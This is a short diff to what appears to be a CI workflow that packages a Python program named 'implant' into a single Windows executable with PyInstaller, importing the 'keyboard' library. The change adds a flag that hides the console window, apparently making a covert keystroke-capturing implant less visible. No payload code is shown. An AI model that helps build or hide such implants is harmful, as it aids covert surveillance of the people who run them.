@@ -25,7 +25,7 @@ jobs:
 
       - name: Build with PyInstaller
         run: |
-          pyinstaller --onefile `
+          pyinstaller --onefile --noconsole `
             --name implant `
             --add-data "implant.py;." `
             --hidden-import=keyboard `
